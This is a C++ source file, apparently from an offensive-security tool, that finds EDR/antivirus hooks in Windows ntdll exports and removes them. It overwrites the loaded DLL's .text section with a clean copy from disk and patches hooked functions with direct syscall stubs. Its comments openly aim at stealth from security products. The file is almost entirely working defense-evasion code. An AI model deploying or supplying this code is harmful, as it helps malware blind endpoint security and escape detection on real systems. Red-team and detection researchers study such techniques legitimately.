#include "Hooking.h"

// From: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/patch_syscall_dynamically64.c
bool checkJmpHooked(char* name, DWORD* address, BOOL bNt) {
    BYTE* opcode = (BYTE*)address;

    // TODO: EDR/AV might bust this string array; for better stealth, take this out of your final program
    // if you know what to unhook beforehand.
    const char* falsePositives[] = {
        "NtGetTickCount",
        "NtQuerySystemTime",
        "NtdllDefWindowProc_A",
        "NtdllDefWindowProc_W",
        "NtdllDialogWndProc_A",
        "NtdllDialogWndProc_W",
        "ZwQuerySystemTime"
    };

    // Some EDRs hook more than Nt* API. Ex: LdrLoadDll 
    if (bNt) {
        if (!(name[0] == 'N' && name[1] == 't')) {
            return false;
        }
    }

    // not all EDRs hook the first byte you will miss some hook
    if (*opcode == 0xe9) {
        // Handle a few false positives...
        // See: https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions
        for (int i = 0; i < (sizeof(falsePositives) / sizeof(const char*)); i++) {
            if (strcmp(name, falsePositives[i]) == 0)
                return false;
        }
        return true;
    }

    return false;
}

std::list<FunctionWithName> getListOfExport(HMODULE libraryStartAddr) {

    std::list<FunctionWithName> lstFunctions = std::list<FunctionWithName>();

    IMAGE_DOS_HEADER* MZ = (IMAGE_DOS_HEADER*)libraryStartAddr;
    IMAGE_NT_HEADERS* PE = (IMAGE_NT_HEADERS*)((BYTE*)libraryStartAddr + MZ->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)libraryStartAddr + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addrOfNames = (DWORD*)((BYTE*)libraryStartAddr + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {

        // Creates a string from the function name.
        FunctionWithName functionWithName = FunctionWithName();
        functionWithName.name = std::string((CHAR*)libraryStartAddr + addrOfNames[i]);;
        functionWithName.startAddr = (DWORD64)GetProcAddress(libraryStartAddr, (char*)libraryStartAddr + addrOfNames[i]);
        functionWithName.ordinal = i + 9;

        // Gets the syscall ID.
        // TODO: Actually, if we are hooked, these 4 bytes might be wrong;
        memcpy(&functionWithName.syscallId, (LPVOID)(functionWithName.startAddr + 4), 2);

        lstFunctions.push_back(functionWithName);
        PRINT_DEBUG("%p - [%d / %x]: %s\n", (void*)functionWithName.startAddr, functionWithName.ordinal, functionWithName.syscallId, functionWithName.name.c_str());
    }

    return lstFunctions;
}

// From: https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
int unhookDllWithDllOverwrite(char* moduleName, char* dllFilePath)
{
    PRINT_DEBUG("Unhooking module '%s'.\n", moduleName);

    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA(moduleName);
    if (!ntdllModule) {
        PRINT_DEBUG("Could not get a handle on module '%s'.\n", moduleName);
        exit(-1);
    }
    PRINT_DEBUG("Got a handle on module '%s'.\n", moduleName);

    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA(dllFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!ntdllMapping) {
        PRINT_DEBUG("Could not map DLL '%s'.\n", dllFilePath);
        exit(-1);
    }

    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        PRINT_DEBUG("Section %s...\n", (char*)hookedSectionHeader->Name);
        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            PRINT_DEBUG("Found .text section...\n");
            DWORD oldProtection = 0;
            PRINT_DEBUG("Unprotecting memory section...\n");
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            PRINT_DEBUG("Overwriting %d bytes: %p -> %p...\n", hookedSectionHeader->Misc.VirtualSize,
                (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress),
                (LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress));
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            PRINT_DEBUG("Re-protecting memory section...\n");
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(process);
    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);

    PRINT_DEBUG("Done unhooking module '%s'.\n", moduleName);

    return 0;
}


std::list<FunctionWithName> getListOfHookedFunctions(std::list<FunctionWithName> funcList, bool checkOnlyNt) {

    std::list<FunctionWithName> lstHookedFunctions = std::list<FunctionWithName>();

    for (std::list<FunctionWithName>::iterator it = funcList.begin(); it != funcList.end(); ++it) {

        bool isHooked = checkJmpHooked((char*)it->name.c_str(), (DWORD*)it->startAddr, checkOnlyNt);

        //If the function is hooked, we push it to our array.
        if (isHooked) {
            lstHookedFunctions.push_back(*it);
            PRINT_DEBUG("%p: %s - is HOOKED.\n", (void*)it->startAddr, it->name.c_str());
        }
    }

    return lstHookedFunctions;
}

std::list<FunctionWithName> getListOfHookedFunctions(HMODULE libraryStartAddr, bool checkOnlyNt) {

    std::list<FunctionWithName> fnsWithName = getListOfExport(libraryStartAddr);
    std::list<FunctionWithName> lstHookedFunctions = getListOfHookedFunctions(fnsWithName, checkOnlyNt);

    return lstHookedFunctions;
}

VOID patchHook(LPVOID address, int syscallId) {
    const DWORD dwSize = 11;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3

    CHAR patch[dwSize + 1];

    PRINT_DEBUG("Patching syscall ID: %d\n", syscallId);

    char high = syscallId >> 8;
    char id = syscallId;

    PRINT_DEBUG("High byte: ");
#ifdef DEBUG
    printByteString(&high, 1);
#endif

    PRINT_DEBUG("Low Byte: ");
#ifdef DEBUG
    printByteString(&id, 1);
#endif

    sprintf_s(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

#ifdef DEBUG

    CHAR originalSequence[dwSize + 1];
    memset(originalSequence, 0, dwSize + 1);
    memcpy_s(originalSequence, dwSize, address, dwSize);
    PRINT_DEBUG("Original byte sequence: ");
    printByteString(originalSequence, dwSize);

    PRINT_DEBUG("Applying patch: ");
    printByteString(patch, dwSize);

#endif

    DWORD dwOld;
    PRINT_DEBUG("Unprotecting memory...\n");
    VirtualProtect(address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    PRINT_DEBUG("Patching address %p...\n", address);
    memcpy_s(address, dwSize, patch, dwSize);
    PRINT_DEBUG("patched!...\n");
    VirtualProtect(address, dwSize, PAGE_EXECUTE_READ, &dwOld);
    PRINT_DEBUG("Reprotecting memory.  Patch applied!\n");
}

void unhookFunctions(std::list<FunctionWithName> lstFunctionsToUnhook) {
    for (std::list<FunctionWithName>::iterator it = lstFunctionsToUnhook.begin(); it != lstFunctionsToUnhook.end(); ++it) {
        patchHook((void*)it->startAddr, it->syscallId);
    }
}